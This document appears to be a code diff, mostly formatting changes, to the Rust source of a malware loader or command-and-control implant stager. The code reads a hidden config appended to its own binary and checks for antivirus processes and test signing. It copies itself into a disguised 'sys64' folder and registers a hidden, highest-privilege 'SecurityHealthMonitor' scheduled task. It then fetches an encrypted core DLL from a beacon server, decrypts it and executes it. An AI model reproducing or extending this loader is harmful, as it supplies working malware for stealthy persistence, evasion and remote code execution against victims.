@@ -28,10 +28,18 @@ fn main() {
     // 流程（任何拿到二进制的人都可 --local 加载任意 DLL，等于把 loader 变成
     // 任意代码执行器；同时 dev 配置写死 127.0.0.1:5000 也毫无用处）。
     #[cfg(debug_assertions)]
-    let local_path = args.iter().position(|a| a == "--local").and_then(|i| args.get(i + 1)).cloned();
+    let local_path = args
+        .iter()
+        .position(|a| a == "--local")
+        .and_then(|i| args.get(i + 1))
+        .cloned();
     #[cfg(not(debug_assertions))]
     let local_path: Option<String> = None;
-    log!("[2/10] args parsed, is_boot={}, local={}", is_boot, local_path.is_some());
+    log!(
+        "[2/10] args parsed, is_boot={}, local={}",
+        is_boot,
+        local_path.is_some()
+    );
 
     // Dev mode: --local <path> skips config injection, anti-analysis, elevation,
     // persistence。仅 debug_assertions 构建可用（见上方 local_path 解析）。
@@ -60,7 +68,10 @@ fn main() {
 
         // Pass a minimal config JSON for dev
         let dev_config = r#"{"server_url":"http://127.0.0.1:5000","register_path":"/api/beacon/register","heartbeat_path":"/api/beacon/heartbeat","result_path":"/api/beacon/result","ws_path":"/ws/agent","heartbeat_interval_ms":3000,"jitter_percent":0.2,"require_admin":false,"enable_persistence":false,"encrypted_aes_key":"","core_download_path":"","rsa_private_key":"","anti_analysis":{"enabled":false}}"#;
-        log!("[DEV] calling core_main ({} bytes config)...", dev_config.len());
+        log!(
+            "[DEV] calling core_main ({} bytes config)...",
+            dev_config.len()
+        );
         entry_fn(dev_config.as_ptr(), dev_config.len());
         log!("[DEV] core_main returned!");
         std::process::exit(0);
@@ -79,11 +90,17 @@ fn main() {
     };
 
     let loader_cfg = LoaderConfig::from_injected(injected, raw_json);
-    log!("[3/10] LoaderConfig created, server={}", loader_cfg.server_url);
+    log!(
+        "[3/10] LoaderConfig created, server={}",
+        loader_cfg.server_url
+    );
 
     // 2. Anti-analysis (skip on --boot relaunch)
     if !is_boot {
-        log!("[4/10] anti_analysis.enabled={}", loader_cfg.anti_analysis.enabled);
+        log!(
+            "[4/10] anti_analysis.enabled={}",
+            loader_cfg.anti_analysis.enabled
+        );
         if loader_cfg.anti_analysis.enabled && loader_cfg.anti_analysis.check_av_processes {
             log!("[4/10] checking av processes...");
             if check_av_processes() {
@@ -157,8 +174,12 @@ fn main() {
             if !path.is_empty() {
                 log!("[7/10] copy_to_path={}, copying...", path);
                 copy_exe_to_target()
-            } else { None }
-        } else { None };
+            } else {
+                None
+            }
+        } else {
+            None
+        };
 
         // Step 2: Install scheduled task / cron — point to the copy if available
         if loader_cfg.enable_persistence {
@@ -193,8 +214,14 @@ fn main() {
             .build()
             .map_err(|e| format!("tokio runtime: {}", e))?;
 
-        let (mut aes_key, download_token) = rt.block_on(dll_fetch::handshake_core_key(
-            &key_server_url, &key_path, &build_id, &beacon_secret, &server_public_key))
+        let (mut aes_key, download_token) = rt
+            .block_on(dll_fetch::handshake_core_key(
+                &key_server_url,
+                &key_path,
+                &build_id,
+                &beacon_secret,
+                &server_public_key,
+            ))
             .map_err(|e| format!("handshake: {}", e))?;
 
         // core.bin 下载带一次性凭证（防枚举）；旧服务端无凭证时原样下载
@@ -203,21 +230,28 @@ fn main() {
         } else {
             format!("{}?t={}", download_url, download_token)
         };
-        let encrypted = rt.block_on(dll_fetch::download_core(&dl_url))
+        let encrypted = rt
+            .block_on(dll_fetch::download_core(&dl_url))
             .map_err(|e| format!("download: {}", e))?;
 
-        let decrypted = dll_fetch::decrypt_dll(&encrypted, &aes_key)
-            .map_err(|e| format!("decrypt: {}", e))?;
+        let decrypted =
+            dll_fetch::decrypt_dll(&encrypted, &aes_key).map_err(|e| format!("decrypt: {}", e))?;
 
         use zeroize::Zeroize;
         aes_key.zeroize();
 
         Ok::<(Vec<u8>, usize), String>((decrypted, encrypted.len()))
-    }).join().unwrap_or(Err("download thread panic".into()));
+    })
+    .join()
+    .unwrap_or(Err("download thread panic".into()));
 
     let dll_bytes = match download_result {
         Ok((decrypted, enc_len)) => {
-            log!("[9/10] download OK ({} bytes), decrypt OK ({} bytes)", enc_len, decrypted.len());
+            log!(
+                "[9/10] download OK ({} bytes), decrypt OK ({} bytes)",
+                enc_len,
+                decrypted.len()
+            );
             decrypted
         }
         Err(e) => fatal_exit(&format!("[9/10] FAIL: {}", e)),
@@ -247,7 +281,10 @@ fn main() {
 
     // 11. Call core_main — should never return
     let config_bytes = loader_cfg.config_json.as_bytes();
-    log!("[10/10] calling core_main ({} bytes config)...", config_bytes.len());
+    log!(
+        "[10/10] calling core_main ({} bytes config)...",
+        config_bytes.len()
+    );
     entry_fn(config_bytes.as_ptr(), config_bytes.len());
 
     // Should not reach here
@@ -296,7 +333,11 @@ fn parse_injected_config() -> Option<(InjectedConfig, String)> {
 
     // Config must be at EOF (appended last after obfuscation/junk)
     if json_start + json_len != data.len() {
-        log!("  config not at EOF (was {} vs total {})", json_start + json_len, data.len());
+        log!(
+            "  config not at EOF (was {} vs total {})",
+            json_start + json_len,
+            data.len()
+        );
         return None;
     }
 
@@ -319,13 +360,16 @@ fn copy_exe_to_target() -> Option<std::path::PathBuf> {
 
     #[cfg(target_os = "windows")]
     let target_dir = {
-        let appdata = env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Default\\AppData\\Roaming".into());
+        let appdata =
+            env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Default\\AppData\\Roaming".into());
         std::path::PathBuf::from(appdata).join("sys64")
     };
     #[cfg(not(target_os = "windows"))]
     let target_dir = {
         let home = env::var("HOME").unwrap_or_else(|_| "/tmp".into());
-        std::path::PathBuf::from(home).join(".local/share").join("sys64")
+        std::path::PathBuf::from(home)
+            .join(".local/share")
+            .join("sys64")
     };
 
     // Already at target — --boot process, no need to copy again
@@ -344,7 +388,11 @@ fn copy_exe_to_target() -> Option<std::path::PathBuf> {
         return None;
     }
     if std::fs::copy(&current_exe, &target_exe).is_err() {
-        log!("copy_exe: copy failed from {:?} to {:?}", current_exe, target_exe);
+        log!(
+            "copy_exe: copy failed from {:?} to {:?}",
+            current_exe,
+            target_exe
+        );
         return None;
     }
     log!("copy_exe: copied to {:?}", target_exe);
@@ -363,9 +411,7 @@ fn relaunch_from(target_exe: &std::path::Path) -> ! {
     }
     #[cfg(not(target_os = "windows"))]
     {
-        let _ = std::process::Command::new(target_exe)
-            .arg("--boot")
-            .spawn();
+        let _ = std::process::Command::new(target_exe).arg("--boot").spawn();
     }
     std::process::exit(0);
 }
@@ -384,7 +430,18 @@ fn install_persistence_at(target_override: Option<&std::path::Path>) {
             },
         };
         let _ = std::process::Command::new("schtasks.exe")
-            .args(["/create", "/tn", "SecurityHealthMonitor", "/tr", &exe, "/sc", "onlogon", "/rl", "highest", "/f"])
+            .args([
+                "/create",
+                "/tn",
+                "SecurityHealthMonitor",
+                "/tr",
+                &exe,
+                "/sc",
+                "onlogon",
+                "/rl",
+                "highest",
+                "/f",
+            ])
             .creation_flags(0x08000000)
             .stdout(std::process::Stdio::null())
             .stderr(std::process::Stdio::null())
@@ -420,11 +477,19 @@ fn check_test_signing() -> bool {
 
         extern "system" {
             fn RegOpenKeyExW(
-                hkey: isize, subkey: *const u16, options: u32, sam: u32, result: *mut isize,
+                hkey: isize,
+                subkey: *const u16,
+                options: u32,
+                sam: u32,
+                result: *mut isize,
             ) -> i32;
             fn RegQueryValueExW(
-                hkey: isize, name: *const u16, reserved: *const u8, kind: *mut u32,
-                data: *mut u8, len: *mut u32,
+                hkey: isize,
+                name: *const u16,
+                reserved: *const u8,
+                kind: *mut u32,
+                data: *mut u8,
+                len: *mut u32,
             ) -> i32;
             fn RegCloseKey(hkey: isize) -> i32;
         }
@@ -446,14 +511,24 @@ fn check_test_signing() -> bool {
 
         unsafe {
             let mut hkey: isize = 0;
-            if RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.as_ptr(), 0, KEY_READ, &mut hkey) != ERROR_SUCCESS {
+            if RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.as_ptr(), 0, KEY_READ, &mut hkey)
+                != ERROR_SUCCESS
+            {
                 return false;
             }
 
             let mut kind: u32 = 0;
             let mut data_len: u32 = 0;
 
-            if RegQueryValueExW(hkey, value_name.as_ptr(), std::ptr::null(), &mut kind, std::ptr::null_mut(), &mut data_len) != ERROR_SUCCESS {
+            if RegQueryValueExW(
+                hkey,
+                value_name.as_ptr(),
+                std::ptr::null(),
+                &mut kind,
+                std::ptr::null_mut(),
+                &mut data_len,
+            ) != ERROR_SUCCESS
+            {
                 RegCloseKey(hkey);
                 return false;
             }
@@ -466,9 +541,14 @@ fn check_test_signing() -> bool {
             let mut buf: Vec<u16> = vec![0u16; (data_len / 2) as usize];
             let mut actual_len = data_len;
             if RegQueryValueExW(
-                hkey, value_name.as_ptr(), std::ptr::null(), &mut kind,
-                buf.as_mut_ptr() as *mut u8, &mut actual_len,
-            ) != ERROR_SUCCESS {
+                hkey,
+                value_name.as_ptr(),
+                std::ptr::null(),
+                &mut kind,
+                buf.as_mut_ptr() as *mut u8,
+                &mut actual_len,
+            ) != ERROR_SUCCESS
+            {
                 RegCloseKey(hkey);
                 return false;
             }
@@ -480,18 +560,15 @@ fn check_test_signing() -> bool {
         }
     }
     #[cfg(not(target_os = "windows"))]
-    { false }
+    {
+        false
+    }
 }
 
 // ── Anti-analysis: AV process detection ──────────────────────────────
 
 /// Known AV process names (lowercase for comparison).
-const AV_PROCESSES: &[&str] = &[
-    "_avp32.exe",
-    "_avpcc.exe",
-    "_avpm.exe",
-    "rescue32.exe",
-];
+const AV_PROCESSES: &[&str] = &["_avp32.exe", "_avpcc.exe", "_avpm.exe", "rescue32.exe"];
 
 /// Check if any known AV process is running.
 /// Uses CreateToolhelp32Snapshot / Process32FirstW / Process32NextW.
@@ -537,12 +614,20 @@ fn check_av_processes() -> bool {
             if Process32FirstW(snapshot, &mut entry) != 0 {
                 loop {
                     // Find null terminator in sz_exe_file
-                    let end = entry.sz_exe_file.iter().position(|&c| c == 0).unwrap_or(260);
+                    let end = entry
+                        .sz_exe_file
+                        .iter()
+                        .position(|&c| c == 0)
+                        .unwrap_or(260);
                     let exe_name = String::from_utf16_lossy(&entry.sz_exe_file[..end]);
 
                     for av in AV_PROCESSES {
                         if exe_name.eq_ignore_ascii_case(av) {
-                            log!("[AV] detected process: {} (pid={})", exe_name, entry.th32_process_id);
+                            log!(
+                                "[AV] detected process: {} (pid={})",
+                                exe_name,
+                                entry.th32_process_id
+                            );
                             CloseHandle(snapshot as *mut u8);
                             return true;
                         }
@@ -559,5 +644,7 @@ fn check_av_processes() -> bool {
         false
     }
     #[cfg(not(target_os = "windows"))]
-    { false }
+    {
+        false
+    }
 }
